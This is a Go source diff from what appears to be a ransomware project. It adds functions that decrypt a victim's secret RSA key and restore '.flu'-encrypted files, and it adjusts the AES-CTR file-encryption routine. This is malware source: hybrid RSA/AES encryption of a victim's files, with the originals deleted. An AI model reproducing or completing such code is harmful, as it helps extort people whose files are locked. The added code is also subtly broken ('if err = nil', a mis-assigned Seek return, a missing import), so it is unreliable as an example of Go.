@@ -9,6 +9,7 @@ import (
     "crypto/rand"
     "crypto/rsa"
     "crypto/aes"
+    "unsafe"
     "bufio"
     "time"
 
@@ -107,37 +108,130 @@ func ImportPublicKey() (*rsa.PublicKey, error) {
     if err != nil {
         return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
     }
-    pk, err := util.ImportPEMPublicKeyRSA(pkData)
+    pk, err := util.ImportDERPublicKeyRSA(pkData)
     return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
 }
 
-func DecryptFile(pk *rsa.PublicKey, path string) error {
-    // TODO
-    return nil
-    //err := decryptFile(pk, path)
-    //if err != nil {
-    //    return err
-    //}
-    //// remove original file
-    //return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
+func ImportSecretKey(aesIVKey []byte) (*rsa.PrivateKey, error) {
+    skDataEncrypted, err := ioutil.ReadFile(victimSecretKey)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to read RSA secret key", err)
+    }
+
+    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
+    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])
+
+    aesStream.XORKeyStream(skDataEncrypted, skDataEncrypted)
+    skData, err := util.Unpad(skDataEncrypted)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to unpad secret key", err)
+    }
+
+    pk, err := util.ImportDERSecretKeyRSA(skData)
+    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA secret key", err)
 }
 
-//func decryptFile(aesIVKey []byte, path string) error {
-//    fEncrypted, err := os.Create(path + ".flu")
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to create file", err)
-//    }
-//    defer fEncrypted.Close()
-//
-//    fOriginal, err := os.Open(path)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to open file", err)
-//    }
-//    defer fOriginal.Close()
-//
-//    iv := aesIVKey[:16]
-//    key := aesIVKey[16:]
-//}
+func DecryptFile(sk *rsa.PrivateKey, path string) error {
+    err := decryptFile(sk, path)
+    if err != nil {
+        return err
+    }
+    originalPath := path[:len(path)-4]
+    originalSize, err := unpaddedSize(originalPath)
+    if err = nil {
+        return errors.Wrap(pkg, "failed to calculate new file size", err)
+    }
+    err = os.Truncate(originalPath, originalSize)
+    if err = nil {
+        return errors.Wrap(pkg, "failed to truncate file", err)
+    }
+    // remove original file
+    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
+}
+
+func unpaddedSize(path string) (int64, error) {
+    f, err := os.Open(path)
+    if err != nil {
+        return 0, err
+    }
+    defer f.Close()
+    err = f.Seek(-1, os.SEEK_END)
+    if err != nil {
+        return 0, err
+    }
+    var padSize [1]byte
+    _, err = io.ReadFull(f, padSize[:])
+    if err != nil {
+        return 0, err
+    }
+    ent, err := f.Stat()
+    if err != nil {
+        return 0, err
+    }
+    return ent.Size()-int64(padSize[0]), nil
+}
+
+func decryptFile(sk *rsa.PrivateKey, path string) error {
+    // the file to decrypt
+    fEncrypted, err := os.Open(path)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to open file", err)
+    }
+    defer fEncrypted.Close()
+
+    if len(path) < 5 || path[len(path)-4:] != ".flu" {
+        return errNotFluFile
+    }
+    newpath := path[:len(path)-4]
+
+    // the file to restore
+    fOriginal, err := os.Create(newpath)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to create file", err)
+    }
+    defer fOriginal.Close()
+
+    r := bufio.NewReader(fEncrypted)
+    w := bufio.NewWriter(fOriginal)
+
+    // compare magic
+    var magic [16]byte
+
+    _, err = io.ReadFull(r, magic[:])
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read magic", err)
+    }
+    if invalidMagic(magic[:]) {
+        return errNotFluFile
+    }
+
+    // read encrypted AES key
+    var aesIVKeyEncrypted [rsaKeyBits/8]byte
+
+    _, err = io.ReadFull(r, aesIVKeyEncrypted[:])
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read AES key", err)
+    }
+
+    // decrypt AES key
+    aesIVKey, err := rsa.DecryptPKCS1v15(rand.Reader, sk, aesIVKeyEncrypted[:])
+    if err != nil {
+        return errors.Wrap(pkg, "failed to decrypt AES key", err)
+    }
+    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
+    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])
+
+    // decrypt file
+    stream := cipher.StreamWriter{S: aesStream, W: w}
+    _, err = io.Copy(stream, r)
+
+    return errors.WrapIfNotNil(pkg, "failed to decrypt file data", err)
+}
+
+func invalidMagic(m []byte) bool {
+    mp := (*[2]uint64)(unsafe.Pointer(&m[0]))
+    return *mp != magicNumbers
+}
 
 func EncryptFile(pk *rsa.PublicKey, path string) error {
     err := encryptFile(pk, path)
@@ -193,10 +287,10 @@ func encryptFile(pk *rsa.PublicKey, path string) error {
     if err != nil {
         return errors.Wrap(pkg, "failed to stat file", err)
     }
-    padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
     stream := cipher.StreamWriter{S: aesStream, W: w}
     _, err = io.Copy(stream, fOriginal)
     if err == nil {
+        padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
         _, err = stream.Write(padding)
     }
     if err != nil {
